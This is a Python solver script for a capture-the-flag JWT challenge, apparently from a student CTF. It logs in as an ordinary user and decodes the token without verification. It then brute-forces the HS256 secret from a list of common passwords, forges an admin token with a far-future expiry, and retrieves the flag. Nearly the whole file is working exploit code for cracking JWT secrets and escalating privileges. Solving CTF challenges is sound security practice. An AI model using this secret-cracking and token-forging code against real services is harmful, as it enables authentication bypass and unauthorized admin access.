#!/usr/bin/env python3

import jwt
import requests
import json

def solve_jwt_challenge():
    base_url = "https://auth.ctf.dscjssstuniv.in/"
    
    print("=== Auth Adventure Solver ===\n")
    
    # Step 1: Login as regular user to get a JWT token
    print("1. Logging in as regular user...")
    
    login_data = {
        'username': 'user',
        'password': 'password123'
    }
    
    session = requests.Session()
    response = session.post(f"{base_url}/login", data=login_data)
    
    if response.status_code == 200:
        print("‚úÖ Login successful!")
        
        # Get the JWT token from cookies
        token = session.cookies.get('token')
        if token:
            print(f"üîë JWT Token: {token}\n")
            
            # Step 2: Decode the token (without verification) to see its structure
            try:
                decoded = jwt.decode(token, options={"verify_signature": False})
                print("üìã Token payload:")
                print(json.dumps(decoded, indent=2))
                print(f"Current role: {decoded['role']}\n")
                
            except Exception as e:
                print(f"Error decoding token: {e}")
                return
            
            # Step 3: Try to crack the secret key
            print("2. Attempting to crack JWT secret...")
            
            common_secrets = [
                "secret",
                "secret123", 
                "password",
                "admin",
                "jwt_secret",
                "key",
                "secretkey",
                "mysecret",
                "12345"
            ]
            
            cracked_secret = None
            for secret in common_secrets:
                try:
                    jwt.decode(token, secret, algorithms=['HS256'])
                    cracked_secret = secret
                    print(f"üéâ Secret cracked: {secret}")
                    break
                except jwt.InvalidTokenError:
                    continue
            
            if not cracked_secret:
                print("‚ùå Could not crack the secret with common passwords")
                return
            
            # Step 4: Create malicious JWT with admin role
            print("\n3. Creating malicious JWT with admin privileges...")
            
            malicious_payload = decoded.copy()
            malicious_payload['role'] = 'admin'
            malicious_payload['username'] = 'admin'
            malicious_payload['user_id'] = 1
            
            malicious_token = jwt.encode(malicious_payload, cracked_secret, algorithm='HS256')
            print(f"üîì Malicious token: {malicious_token}")
            
            # Step 5: Use the malicious token to access admin area
            print("\n4. Accessing admin area with malicious token...")
            
            session.cookies.set('token', malicious_token)
            response = session.get(f"{base_url}/")
            
            if "DSCCTF{" in response.text:
                print("üéâ SUCCESS! Admin access gained!")
                
                # Extract flag from response
                flag_start = response.text.find("DSCCTF{")
                flag_end = response.text.find("}", flag_start) + 1
                flag = response.text[flag_start:flag_end]
                
                print(f"üö© FLAG: {flag}")
            else:
                print("‚ùå Failed to gain admin access")
                print("Response:", response.text[:200] + "...")
        
        else:
            print("‚ùå No JWT token found in response")
    else:
        print(f"‚ùå Login failed: {response.status_code}")

def manual_jwt_creation():
    """Alternative method: manually create JWT if you know the structure"""
    print("\n=== Manual JWT Creation ===")
    
    secret = "secret123"  # Known secret
    
    payload = {
        'username': 'admin',
        'role': 'admin',
        'user_id': 1,
        'exp': 9999999999  # Far future expiry
    }
    
    token = jwt.encode(payload, secret, algorithm='HS256')
    print(f"Manual admin token: {token}")
    
    return token

if __name__ == "__main__":
    solve_jwt_challenge()
    
    print("\n" + "="*50)
    print("Alternative approach:")
    manual_jwt_creation()
    
    print("\nüìù Solution Summary:")
    print("1. Login with user:password123 to get initial JWT")
    print("2. Decode JWT to see structure (role: 'user')")
    print("3. Brute force the secret key (weak: 'secret123')")
    print("4. Create new JWT with role: 'admin'")
    print("5. Use malicious JWT to access admin panel and get flag")